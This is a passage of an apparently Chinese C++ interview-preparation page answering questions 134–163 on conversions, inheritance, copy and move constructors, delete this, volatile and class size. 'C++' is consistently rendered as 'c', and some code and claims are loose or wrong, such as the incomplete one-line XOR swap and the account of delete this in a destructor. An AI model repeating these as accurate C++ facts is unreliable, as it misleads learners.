title="134、隐式转换，如何消除隐式转换？"></a>134、隐式转换，如何消除隐式转换？</h4><p>1、c的基本类型中并非完全的对立，部分数据类型之间是可以进行隐式转换的。所谓隐式转换，是指不需要用户干预，编译器私下进行的类型转换行为。很多时候用户可能都不知道进行了哪些转换</p><p>2、c面向对象的多态特性，就是通过父类的类型实现对子类的封装。通过隐式转换，你可以直接将一个子类的对象使用父类的类型进行返回。在比如，数值和布尔类型的转换，整数和浮点数的转换等。某些方面来说，隐式转换给c程序开发者带来了不小的便捷。c是一门强类型语言，类型的检查是非常严格的。</p><p>3、 基本数据类型 基本数据类型的转换以取值范围的作为转换基础（保证精度不丢失）。隐式转换发生在从小-&gt;大的转换中。比如从char转换为int。从int-&gt;long。自定义对象 子类对象可以隐式的转换为父类对象。</p><p>4、 c中提供了explicit关键字，在构造函数声明的时候加上explicit关键字，能够禁止隐式转换。</p><p>5、如果构造函数只接受一个参数，则它实际上定义了转换为此类类型的隐式转换机制。可以通过将构造函数声明为explicit加以制止隐式类型转换，关键字explicit只对一个实参的构造函数有效，需要多个实参的构造函数不能用于执行隐式转换，所以无需将这些构造函数指定为explicit。</p><h4 id="135、-虚函数的内存结构，那菱形继承的虚函数内存结构呢"><a href="#135、-虚函数的内存结构，那菱形继承的虚函数内存结构呢" class="headerlink" title="135、 虚函数的内存结构，那菱形继承的虚函数内存结构呢"></a>135、 虚函数的内存结构，那菱形继承的虚函数内存结构呢</h4><p>参考：<a href="https://blog.csdn.net/haoel/article/details/1948051/">https://blog.csdn.net/haoel/article/details/1948051/</a></p><p> 菱形继承的定义是：两个子类继承同一父类，而又有子类同时继承这两个子类。例如a,b两个类同时继承c，但是又有一个d类同时继承a,b类。</p><h4 id="136、多继承的优缺点，作为一个开发者怎么看待多继承"><a href="#136、多继承的优缺点，作为一个开发者怎么看待多继承" class="headerlink" title="136、多继承的优缺点，作为一个开发者怎么看待多继承"></a>136、多继承的优缺点，作为一个开发者怎么看待多继承</h4><p>1) c允许为一个派生类指定多个基类，这样的继承结构被称做多重继承。</p><p>2) 多重继承的优点很明显，就是对象可以调用多个基类中的接口；</p><p>3) 如果派生类所继承的多个基类有相同的基类，而派生类对象需要调用这个祖先类的接口方法，就会容易出现二义性</p><p>4) 加上全局符确定调用哪一份拷贝。比如pa.Author::eat()调用属于Author的拷贝。</p><p>5) 使用虚拟继承，使得多重继承类Programmer_Author只拥有Person类的一份拷贝。</p><h4 id="137、迭代器：-it、it-哪个好，为什么"><a href="#137、迭代器：-it、it-哪个好，为什么" class="headerlink" title="137、迭代器：++it、it++哪个好，为什么"></a>137、迭代器：++it、it++哪个好，为什么</h4><p>1)  前置返回一个引用，后置返回一个对象</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// ++i实现代码为：</span><span class="token keyword">int</span><span class="token operator">&amp;</span> <span class="token keyword">operator</span><span class="token operator">++</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token operator">*</span><span class="token keyword">this</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token operator">*</span><span class="token keyword">this</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </code></pre><p>2)  前置不会产生临时对象，后置必须产生临时对象，临时对象会导致效率降低</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">//i++实现代码为：                 </span><span class="token keyword">int</span> <span class="token keyword">operator</span><span class="token operator">++</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>                 <span class="token punctuation">&#123;</span><span class="token keyword">int</span> temp <span class="token operator">=</span> <span class="token operator">*</span><span class="token keyword">this</span><span class="token punctuation">;</span>                      <span class="token operator">++</span><span class="token operator">*</span><span class="token keyword">this</span><span class="token punctuation">;</span>                          <span class="token keyword">return</span> temp<span class="token punctuation">;</span>                  <span class="token punctuation">&#125;</span> </code></pre><h4 id="138、c如何处理多个异常的？"><a href="#138、c如何处理多个异常的？" class="headerlink" title="138、c如何处理多个异常的？"></a>138、c如何处理多个异常的？</h4><p>1)  c中的异常情况：<br> 语法错误（编译错误）：比如变量未定义、括号不匹配、关键字拼写错误等等编译器在编译时能发现的错误，这类错误可以及时被编译器发现，而且可以及时知道出错的位置及原因，方便改正。<br> 运行时错误：比如数组下标越界、系统内存不足等等。这类错误不易被程序员发现，它能通过编译且能进入运行，但运行时会出错，导致程序崩溃。为了有效处理程序运行时错误，c中引入异常处理机制来解决此问题。</p><p>2)  c异常处理机制：<br> 异常处理基本思想：执行一个函数的过程中发现异常，可以不用在本函数内立即进行处理， 而是抛出该异常，让函数的调用者直接或间接处理这个问题。<br> c异常处理机制由3个模块组成：try(检查)、throw(抛出)、catch(捕获)<br> 抛出异常的语句格式为：throw 表达式；如果try块中程序段发现了异常则抛出异常。 </p> <pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">try</span>  <span class="token punctuation">&#123;</span>  可能抛出异常的语句；（检查）  <span class="token punctuation">&#125;</span>  <span class="token keyword">catch</span>（类型名<span class="token punctuation">[</span>形参名<span class="token punctuation">]</span>）<span class="token comment">//捕获特定类型的异常 </span> <span class="token punctuation">&#123;</span>  <span class="token comment">//处理1； </span> <span class="token punctuation">&#125;</span>  <span class="token keyword">catch</span>（类型名<span class="token punctuation">[</span>形参名<span class="token punctuation">]</span>）<span class="token comment">//捕获特定类型的异常 </span> <span class="token punctuation">&#123;</span>  <span class="token comment">//处理2； </span> <span class="token punctuation">&#125;</span>  <span class="token keyword">catch</span>（…）<span class="token comment">//捕获所有类型的异常 </span> <span class="token punctuation">&#123;</span>  <span class="token punctuation">&#125;</span> </code></pre><h4 id="139、模板和实现可不可以不写在一个文件里面？为什么？"><a href="#139、模板和实现可不可以不写在一个文件里面？为什么？" class="headerlink" title="139、模板和实现可不可以不写在一个文件里面？为什么？"></a>139、模板和实现可不可以不写在一个文件里面？为什么？</h4><p>因为在编译时模板并不能生成真正的二进制代码，而是在编译调用模板类或函数的CPP文件时才会去找对应的模板声明和实现，在这种情况下编译器是不知道实现模板类或函数的CPP文件的存在，所以它只能找到模板类或函数的声明而找不到实现，而只好创建一个符号寄希望于链接程序找地址。</p><p>但模板类或函数的实现并不能被编译成二进制代码，结果链接程序找不到地址只好报错了。<br> 《c编程思想》第15章(第300页)说明了原因：模板定义很特殊。由template&lt;…&gt;处理的任何东西都意味着编译器在当时不为它分配存储空间，</p><p>它一直处于等待状态直到被一个模板实例告知。在编译器和连接器的某一处，有一机制能去掉指定模板的多重定义。所以为了容易使用，几乎总是在头文件中放置全部的模板声明和定义。</p><h4 id="140、在成员函数中调用delete-this会出现什么问题？对象还可以使用吗？"><a href="#140、在成员函数中调用delete-this会出现什么问题？对象还可以使用吗？" class="headerlink" title="140、在成员函数中调用delete this会出现什么问题？对象还可以使用吗？"></a>140、在成员函数中调用delete this会出现什么问题？对象还可以使用吗？</h4><p>1、在类对象的内存空间中，只有数据成员和虚函数表指针，并不包含代码内容，类的成员函数单独放在代码段中。在调用成员函数时，隐含传递一个this指针，让成员函数知道当前是哪个对象在调用它。当调用delete this时，类对象的内存空间被释放。在delete this之后进行的其他任何函数调用，只要不涉及到this指针的内容，都能够正常运行。一旦涉及到this指针，如操作数据成员，调用虚函数等，就会出现不可预期的问题。</p><p>2、为什么是不可预期的问题？</p><p>delete this之后不是释放了类对象的内存空间了么，那么这段内存应该已经还给系统，不再属于这个进程。照这个逻辑来看，应该发生指针错误，无访问权限之类的令系统崩溃的问题才对啊？这个问题牵涉到操作系统的内存管理策略。delete this释放了类对象的内存空间，但是内存空间却并不是马上被回收到系统中，可能是缓冲或者其他什么原因，导致这段内存空间暂时并没有被系统收回。此时这段内存是可以访问的，你可以加上100，加上200，但是其中的值却是不确定的。当你获取数据成员，可能得到的是一串很长的未初始化的随机数；访问虚函数表，指针无效的可能性非常高，造成系统崩溃。</p><p>3、 如果在类的析构函数中调用delete this，会发生什么？</p><p>会导致堆栈溢出。原因很简单，delete的本质是“为将被释放的内存调用一个或多个析构函数，然后，释放内存”。显然，delete this会去调用本对象的析构函数，而析构函数中又调用delete this，形成无限递归，造成堆栈溢出，系统崩溃。</p><h4 id="141、如何在不使用额外空间的情况下，交换两个数？你有几种方法"><a href="#141、如何在不使用额外空间的情况下，交换两个数？你有几种方法" class="headerlink" title="141、如何在不使用额外空间的情况下，交换两个数？你有几种方法"></a>141、如何在不使用额外空间的情况下，交换两个数？你有几种方法</h4><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token number">1</span><span class="token punctuation">)</span>  算术x <span class="token operator">=</span> x <span class="token operator">+</span> y<span class="token punctuation">;</span> y <span class="token operator">=</span> x <span class="token operator">-</span> y<span class="token punctuation">;</span>x <span class="token operator">=</span> x <span class="token operator">-</span> y<span class="token punctuation">;</span> <span class="token number">2</span><span class="token punctuation">)</span>  异或x <span class="token operator">=</span> x<span class="token operator">^</span>y<span class="token punctuation">;</span><span class="token comment">// 只能对int,char..</span> y <span class="token operator">=</span> x<span class="token operator">^</span>y<span class="token punctuation">;</span> x <span class="token operator">=</span> x<span class="token operator">^</span>y<span class="token punctuation">;</span> x <span class="token operator">^=</span> y <span class="token operator">^=</span> x<span class="token punctuation">;</span></code></pre><h4 id="142、你知道strcpy和memcpy的区别是什么吗？"><a href="#142、你知道strcpy和memcpy的区别是什么吗？" class="headerlink" title="142、你知道strcpy和memcpy的区别是什么吗？"></a>142、你知道strcpy和memcpy的区别是什么吗？</h4><p>1、复制的内容不同。strcpy只能复制字符串，而memcpy可以复制任意内容，例如字符数组、整型、结构体、类等。<br> 2、复制的方法不同。strcpy不需要指定长度，它遇到被复制字符的串结束符”\0”才结束，所以容易溢出。memcpy则是根据其第3个参数决定复制的长度。<br> 3、用途不同。通常在复制字符串时用strcpy，而需要复制其他类型数据时则一般用memcpy</p><h4 id="143、程序在执行int-main-int-argc-char-argv-时的内存结构，你了解吗？"><a href="#143、程序在执行int-main-int-argc-char-argv-时的内存结构，你了解吗？" class="headerlink" title="143、程序在执行int main(int argc, char *argv[])时的内存结构，你了解吗？"></a>143、程序在执行int main(int argc, char *argv[])时的内存结构，你了解吗？</h4><p>参数的含义是程序在命令行下运行的时候，需要输入argc 个参数，每个参数是以char 类型输入的，依次存在数组里面，数组是 argv[]，所有的参数在指针</p><p>char * 指向的内存中，数组的中元素的个数为 argc 个，第一个参数为程序的名称。</p><h4 id="144、volatile关键字的作用？"><a href="#144、volatile关键字的作用？" class="headerlink" title="144、volatile关键字的作用？"></a>144、volatile关键字的作用？</h4><p>volatile 关键字是一种类型修饰符，用它声明的类型变量表示可以被某些编译器未知的因素更改，比如：操作系统、硬件或者其它线程等。遇到这个关键字声明的变量，编译器对访问该变量的代码就不再进行优化，从而可以提供对特殊地址的稳定访问。声明时语法：int volatile vInt; 当要求使用 volatile 声明的变量的值的时候，系统总是重新从它所在的内存读取数据，即使它前面的指令刚刚从该处读取过数据。而且读取的数据立刻被保存。</p><p>volatile用在如下的几个地方：<br> 1) 中断服务程序中修改的供其它程序检测的变量需要加volatile；<br> 2) 多任务环境下各任务间共享的标志应该加volatile；<br> 3) 存储器映射的硬件寄存器通常也要加volatile说明，因为每次对它的读写都可能由不同意义；</p><h4 id="145、如果有一个空类，它会默认添加哪些函数？"><a href="#145、如果有一个空类，它会默认添加哪些函数？" class="headerlink" title="145、如果有一个空类，它会默认添加哪些函数？"></a>145、如果有一个空类，它会默认添加哪些函数？</h4><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token function">Empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 缺省构造函数//</span><span class="token number">2</span><span class="token punctuation">)</span>  <span class="token function">Empty</span><span class="token punctuation">(</span> <span class="token keyword">const</span> Empty<span class="token operator">&amp;</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 拷贝构造函数//</span><span class="token number">3</span><span class="token punctuation">)</span>  <span class="token operator">~</span><span class="token function">Empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 析构函数//</span><span class="token number">4</span><span class="token punctuation">)</span>  Empty<span class="token operator">&amp;</span> <span class="token keyword">operator</span><span class="token operator">=</span><span class="token punctuation">(</span> <span class="token keyword">const</span> Empty<span class="token operator">&amp;</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 赋值运算符//</span></code></pre><h4 id="146、c中标准库是什么？"><a href="#146、c中标准库是什么？" class="headerlink" title="146、c中标准库是什么？"></a>146、c中标准库是什么？</h4><p>1)  c 标准库可以分为两部分：</p><p>标准函数库： 这个库是由通用的、独立的、不属于任何类的函数组成的。函数库继承自 C 语言。</p><p>面向对象类库： 这个库是类及其相关函数的集合。</p><p>2)   输入/输出 I/O、字符串和字符处理、数学、时间、日期和本地化、动态分配、其他、宽字符函数</p><p>3)   标准的 c I/O 类、String 类、数值类、STL 容器类、STL 算法、STL 函数对象、STL 迭代器、STL 分配器、本地化库、异常处理类、杂项支持库</p><h4 id="147、你知道const-char-与string之间的关系是什么吗？"><a href="#147、你知道const-char-与string之间的关系是什么吗？" class="headerlink" title="147、你知道const char* 与string之间的关系是什么吗？"></a>147、你知道const char* 与string之间的关系是什么吗？</h4><p>1)  string 是c标准库里面其中一个，封装了对字符串的操作，实际操作过程我们可以用const char*给string类初始化</p><p>2)  三者的转化关系如下所示： </p><pre class="language-cpp" data-language="cpp"><code class="language-cpp">a<span class="token punctuation">)</span>  string转<span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> string s <span class="token operator">=</span> “abc”<span class="token punctuation">;</span> <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> c_s <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">c_str</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> b<span class="token punctuation">)</span>  <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> 转string，直接赋值即可 <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> c_s <span class="token operator">=</span> “abc”<span class="token punctuation">;</span>  string <span class="token function">s</span><span class="token punctuation">(</span>c_s<span class="token punctuation">)</span><span class="token punctuation">;</span> c<span class="token punctuation">)</span>  string 转<span class="token keyword">char</span><span class="token operator">*</span>  string s <span class="token operator">=</span> “abc”<span class="token punctuation">;</span>  <span class="token keyword">char</span><span class="token operator">*</span> c<span class="token punctuation">;</span>  <span class="token keyword">const</span> <span class="token keyword">int</span> len <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  c <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">char</span><span class="token punctuation">[</span>len<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token function">strcpy</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>s<span class="token punctuation">.</span><span class="token function">c_str</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> d<span class="token punctuation">)</span>  <span class="token keyword">char</span><span class="token operator">*</span> 转string  <span class="token keyword">char</span><span class="token operator">*</span> c <span class="token operator">=</span> “abc”<span class="token punctuation">;</span>  string <span class="token function">s</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span> e<span class="token punctuation">)</span>  <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> 转<span class="token keyword">char</span><span class="token operator">*</span>  <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> cpc <span class="token operator">=</span> “abc”<span class="token punctuation">;</span>  <span class="token keyword">char</span><span class="token operator">*</span> pc <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token function">strlen</span><span class="token punctuation">(</span>cpc<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token function">strcpy</span><span class="token punctuation">(</span>pc<span class="token punctuation">,</span>cpc<span class="token punctuation">)</span><span class="token punctuation">;</span>f<span class="token punctuation">)</span>  <span class="token keyword">char</span><span class="token operator">*</span> 转<span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span>，直接赋值即可  <span class="token keyword">char</span><span class="token operator">*</span> pc <span class="token operator">=</span> “abc”<span class="token punctuation">;</span>  <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> cpc <span class="token operator">=</span> pc<span class="token punctuation">;</span></code></pre><h4 id="148、为什么拷贝构造函数必须传引用不能传值？"><a href="#148、为什么拷贝构造函数必须传引用不能传值？" class="headerlink" title="148、为什么拷贝构造函数必须传引用不能传值？"></a>148、为什么拷贝构造函数必须传引用不能传值？</h4><p>1) 拷贝构造函数的作用就是用来复制对象的，在使用这个对象的实例来初始化这个对象的一个新的实例。<br>2) 参数传递过程到底发生了什么？<br>  将地址传递和值传递统一起来，归根结底还是传递的是”值”(地址也是值，只不过通过它可以找到另一个值)！<br> i)值传递:<br>  对于内置数据类型的传递时，直接赋值拷贝给形参(注意形参是函数内局部变量)；<br>  对于类类型的传递时，需要首先调用该类的拷贝构造函数来初始化形参(局部对象)；</p><p>如void foo(class_type obj_local){}, 如果调用foo(obj); 首先class_type obj_local(obj) ,这样就定义了局部变量obj_local供函数内部使用</p><p>ii)引用传递:<br>   无论对内置类型还是类类型，传递引用或指针最终都是传递的地址值！而地址总是指针类型(属于简单类型), 显然参数传递时，按简单类型的赋值拷贝，而不会有拷贝构造函数的调用(对于类类型).<br> 上述1) 2)回答了为什么拷贝构造函数使用值传递会产生无限递归调用，内存溢出。</p><p>拷贝构造函数用来初始化一个非引用类类型对象，如果用传值的方式进行传参数，那么构造实参需要调用拷贝构造函数，而拷贝构造函数需要传递实参，所以会一直递归。</p><h4 id="149、你知道空类的大小是多少吗？"><a href="#149、你知道空类的大小是多少吗？" class="headerlink" title="149、你知道空类的大小是多少吗？"></a>149、你知道空类的大小是多少吗？</h4><p>1)  c空类的大小不为0，不同编译器设置不一样，vs设置为1；</p><p>2)  c标准指出，不允许一个对象（当然包括类对象）的大小为0，不同的对象不能具有相同的地址；</p><p>3)  带有虚函数的c类大小不为1，因为每一个对象会有一个vptr指向虚函数表，具体大小根据指针大小确定；</p><p>4)  c中要求对于类的每个实例都必须有独一无二的地址,那么编译器自动为空类分配一个字节大小，这样便保证了每个实例均有独一无二的内存地址。</p><h4 id="150、你什么情况用指针当参数，什么时候用引用，为什么？"><a href="#150、你什么情况用指针当参数，什么时候用引用，为什么？" class="headerlink" title="150、你什么情况用指针当参数，什么时候用引用，为什么？"></a>150、你什么情况用指针当参数，什么时候用引用，为什么？</h4><p>1)  使用引用参数的主要原因有两个：</p><p>程序员能修改调用函数中的数据对象</p><p>通过传递引用而不是整个数据–对象，可以提高程序的运行速度 </p><p>2)  一般的原则：<br> 对于使用引用的值而不做修改的函数：</p><p>如果数据对象很小，如内置数据类型或者小型结构，则按照值传递；</p><p>如果数据对象是数组，则使用指针（唯一的选择），并且指针声明为指向const的指针；</p><p>如果数据对象是较大的结构，则使用const指针或者引用，已提高程序的效率。这样可以节省结构所需的时间和空间；</p><p>如果数据对象是类对象，则使用const引用（传递类对象参数的标准方式是按照引用传递）；</p><p>3)  对于修改函数中数据的函数：</p><p>如果数据是内置数据类型，则使用指针</p><p>如果数据对象是数组，则只能使用指针</p><p>如果数据对象是结构，则使用引用或者指针</p><p>如果数据是类对象，则使用引用</p><h4 id="151、静态函数能定义为虚函数吗？常函数呢？说说你的理解"><a href="#151、静态函数能定义为虚函数吗？常函数呢？说说你的理解" class="headerlink" title="151、静态函数能定义为虚函数吗？常函数呢？说说你的理解"></a>151、静态函数能定义为虚函数吗？常函数呢？说说你的理解</h4><p>1、static成员不属于任何类对象或类实例，所以即使给此函数加上virutal也是没有任何意义的。</p><p>2、静态与非静态成员函数之间有一个主要的区别，那就是静态成员函数没有this指针。</p><p>虚函数依靠vptr和vtable来处理。vptr是一个指针，在类的构造函数中创建生成，并且只能用this指针来访问它，因为它是类的一个成员，并且vptr指向保存虚函数地址的vtable.对于静态成员函数，它没有this指针，所以无法访问vptr。</p><p>这就是为何static函数不能为virtual，虚函数的调用关系：this -&gt; vptr -&gt; vtable -&gt;virtual function</p><h4 id="152、this指针调用成员变量时，堆栈会发生什么变化？"><a href="#152、this指针调用成员变量时，堆栈会发生什么变化？" class="headerlink" title="152、this指针调用成员变量时，堆栈会发生什么变化？"></a>152、this指针调用成员变量时，堆栈会发生什么变化？</h4><p>当在类的非静态成员函数访问类的非静态成员时，编译器会自动将对象的地址传给作为隐含参数传递给函数，这个隐含参数就是this指针。</p><p>即使你并没有写this指针，编译器在链接时也会加上this的，对各成员的访问都是通过this的。</p><p>例如你建立了类的多个对象时，在调用类的成员函数时，你并不知道具体是哪个对象在调用，此时你可以通过查看this指针来查看具体是哪个对象在调用。This指针首先入栈，然后成员函数的参数从右向左进行入栈，最后函数返回地址入栈。</p><h4 id="153、你知道静态绑定和动态绑定吗？讲讲？"><a href="#153、你知道静态绑定和动态绑定吗？讲讲？" class="headerlink" title="153、你知道静态绑定和动态绑定吗？讲讲？"></a>153、你知道静态绑定和动态绑定吗？讲讲？</h4><p>1)  对象的静态类型：对象在声明时采用的类型。是在编译期确定的。</p><p>2)  对象的动态类型：目前所指对象的类型。是在运行期决定的。对象的动态类型可以更改，但是静态类型无法更改。</p><p>3)  静态绑定：绑定的是对象的静态类型，某特性（比如函数依赖于对象的静态类型，发生在编译期。</p><p>4)  动态绑定：绑定的是对象的动态类型，某特性（比如函数依赖于对象的动态类型，发生在运行期。</p><h4 id="154、如何设计一个类计算子类的个数？"><a href="#154、如何设计一个类计算子类的个数？" class="headerlink" title="154、如何设计一个类计算子类的个数？+"></a>154、如何设计一个类计算子类的个数？+</h4><p>1、为类设计一个static静态变量count作为计数器；</p><p>2、类定义结束后初始化count;</p><p>3、在构造函数中对count进行+1;</p><p>4、 设计拷贝构造函数，在进行拷贝构造函数中进行count +1，操作；</p><p>5、设计复制构造函数，在进行复制函数中对count+1操作；</p><p>6、在析构函数中对count进行-1；</p><h4 id="155、怎么快速定位错误出现的地方"><a href="#155、怎么快速定位错误出现的地方" class="headerlink" title="155、怎么快速定位错误出现的地方"></a>155、怎么快速定位错误出现的地方</h4><p>1、如果是简单的错误，可以直接双击错误列表里的错误项或者生成输出的错误信息中带行号的地方就可以让编辑窗口定位到错误的位置上。</p><p>2、对于复杂的模板错误，最好使用生成输出窗口。</p><p>多数情况下出发错误的位置是最靠后的引用位置。如果这样确定不了错误，就需要先把自己写的代码里的引用位置找出来，然后逐个分析了。</p><h4 id="156、虚函数的代价？"><a href="#156、虚函数的代价？" class="headerlink" title="156、虚函数的代价？"></a>156、虚函数的代价？</h4><p>1)  带有虚函数的类，每一个类会产生一个虚函数表，用来存储指向虚成员函数的指针，增大类；</p><p>2)  带有虚函数的类的每一个对象，都会有有一个指向虚表的指针，会增加对象的空间大小；</p><p>3)  不能再是内敛的函数，因为内敛函数在编译阶段进行替代，而虚函数表示等待，在运行阶段才能确定到低是采用哪种函数，虚函数不能是内敛函数。</p><h4 id="157、类对象的大小受哪些因素影响？"><a href="#157、类对象的大小受哪些因素影响？" class="headerlink" title="157、类对象的大小受哪些因素影响？"></a>157、类对象的大小受哪些因素影响？</h4><p>1)  类的非静态成员变量大小，静态成员不占据类的空间，成员函数也不占据类的空间大小；</p><p>2)  内存对齐另外分配的空间大小，类内的数据也是需要进行内存对齐操作的；</p><p>3)  虚函数的话，会在类对象插入vptr指针，加上指针大小；</p><p>4)  当该该类是某类的派生类，那么派生类继承的基类部分的数据成员也会存在在派生类中的空间中，也会对派生类进行扩展。</p><h4 id="158、移动构造函数听说过吗？说说"><a href="#158、移动构造函数听说过吗？说说" class="headerlink" title="158、移动构造函数听说过吗？说说"></a>158、移动构造函数听说过吗？说说</h4><p>1)  有时候我们会遇到这样一种情况，我们用对象a初始化对象b后对象a我们就不在使用了，但是对象a的空间还在呀（在析构之前），既然拷贝构造函数，实际上就是把a对象的内容复制一份到b中，那么为什么我们不能直接使用a的空间呢？这样就避免了新的空间的分配，大大降低了构造的成本。这就是移动构造函数设计的初衷；</p><p>2)  拷贝构造函数中，对于指针，我们一定要采用深层复制，而移动构造函数中，对于指针，我们采用浅层复制；</p><p>3)  c引入了移动构造函数，专门处理这种，用a初始化b后，就将a析构的情况；</p><p>4)  与拷贝类似，移动也使用一个对象的值设置另一个对象的值。但是，又与拷贝不同的是，移动实现的是对象值真实的转移（源对象到目的对象）：源对象将丢失其内容，其内容将被目的对象占有。移动操作的发生的时候，是当移动值的对象是未命名的对象的时候。这里未命名的对象就是那些临时变量，甚至都不会有名称。典型的未命名对象就是函数的返回值或者类型转换的对象。使用临时对象的值初始化另一个对象值，不会要求对对象的复制：因为临时对象不会有其它使用，因而，它的值可以被移动到目的对象。做到这些，就要使用移动构造函数和移动赋值：当使用一个临时变量对象进行构造初始化的时候，调用移动构造函数。类似的，使用未命名的变量的值赋给一个对象时，调用移动赋值操作；</p><p>5)  </p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token function">Example6</span> <span class="token punctuation">(</span>Example6<span class="token operator">&amp;&amp;</span> x<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token function">ptr</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span>ptr<span class="token punctuation">)</span>   <span class="token punctuation">&#123;</span>    x<span class="token punctuation">.</span>ptr <span class="token operator">=</span> <span class="token keyword">nullptr</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">// move assignment</span>  Example6<span class="token operator">&amp;</span> <span class="token keyword">operator</span><span class="token operator">=</span> <span class="token punctuation">(</span>Example6<span class="token operator">&amp;&amp;</span> x<span class="token punctuation">)</span>   <span class="token punctuation">&#123;</span>   <span class="token keyword">delete</span> ptr<span class="token punctuation">;</span>    ptr <span class="token operator">=</span> x<span class="token punctuation">.</span>ptr<span class="token punctuation">;</span>   x<span class="token punctuation">.</span>ptr<span class="token operator">=</span><span class="token keyword">nullptr</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">*</span><span class="token keyword">this</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="159、-什么时候合成构造函数？都说一说，你知道的都说一下"><a href="#159、-什么时候合成构造函数？都说一说，你知道的都说一下" class="headerlink" title="159、 什么时候合成构造函数？都说一说，你知道的都说一下"></a>159、 什么时候合成构造函数？都说一说，你知道的都说一下</h4><p>1)  如果一个类没有任何构造函数，但他含有一个成员对象，该成员对象含有默认构造函数，那么编译器就为该类合成一个默认构造函数，因为不合成一个默认构造函数那么该成员对象的构造函数不能调用；</p><p>2)  没有任何构造函数的类派生自一个带有默认构造函数的基类，那么需要为该派生类合成一个构造函数，只有这样基类的构造函数才能被调用；</p><p>3)  带有虚函数的类，虚函数的引入需要进入虚表，指向虚表的指针，该指针是在构造函数中初始化的，所以没有构造函数的话该指针无法被初始化；</p><p>4)  带有一个虚基类的类</p><p> 还有一点需要注意的是：</p><p>1)  并不是任何没有构造函数的类都会合成一个构造函数</p><p>2)  编译器合成出来的构造函数并不会显示设定类内的每一个成员变量</p><h4 id="160、那什么时候需要合成拷贝构造函数呢？"><a href="#160、那什么时候需要合成拷贝构造函数呢？" class="headerlink" title="160、那什么时候需要合成拷贝构造函数呢？"></a>160、那什么时候需要合成拷贝构造函数呢？</h4><p>有三种情况会以一个对象的内容作为另一个对象的初值：</p><p>1)  对一个对象做显示的初始化操作，X xx = x;</p><p>2)  当对象被当做参数交给某个函数时；</p><p>3)  当函数传回一个类对象时；</p><p>1)  如果一个类没有拷贝构造函数，但是含有一个类类型的成员变量，该类型含有拷贝构造函数，此时编译器会为该类合成一个拷贝构造函数；</p><p>2)  如果一个类没有拷贝构造函数，但是该类继承自含有拷贝构造函数的基类，此时编译器会为该类合成一个拷贝构造函数；</p><p>3)  如果一个类没有拷贝构造函数，但是该类声明或继承了虚函数，此时编译器会为该类合成一个拷贝构造函数；</p><p>4)  如果一个类没有拷贝构造函数，但是该类含有虚基类，此时编译器会为该类合成一个拷贝构造函数；</p><h4 id="161、成员初始化列表会在什么时候用到？它的调用过程是什么？"><a href="#161、成员初始化列表会在什么时候用到？它的调用过程是什么？" class="headerlink" title="161、成员初始化列表会在什么时候用到？它的调用过程是什么？"></a>161、成员初始化列表会在什么时候用到？它的调用过程是什么？</h4><p>1)  当初始化一个引用成员变量时；</p><p>2)  初始化一个const成员变量时；</p><p>3)  当调用一个基类的构造函数，而构造函数拥有一组参数时；</p><p>4)  当调用一个成员类的构造函数，而他拥有一组参数；</p><p>5)  编译器会一一操作初始化列表，以适当顺序在构造函数之内安插初始化操作，并且在任何显示用户代码前。list中的项目顺序是由类中的成员声明顺序决定的，不是初始化列表中的排列顺序决定的。</p><h4 id="162、构造函数的执行顺序是什么？"><a href="#162、构造函数的执行顺序是什么？" class="headerlink" title="162、构造函数的执行顺序是什么？"></a>162、构造函数的执行顺序是什么？</h4><p>1)  在派生类构造函数中，所有的虚基类及上一层基类的构造函数调用；</p><p>2)  对象的vptr被初始化；</p><p>3)  如果有成员初始化列表，将在构造函数体内扩展开来，这必须在vptr被设定之后才做；</p><p>4)  执行程序员所提供的代码；</p><h4 id="163、一个类中的全部构造函数的扩展过程是什么？"><a href="#163、一个类中的全部构造函数的扩展过程是什么？" class="headerlink" 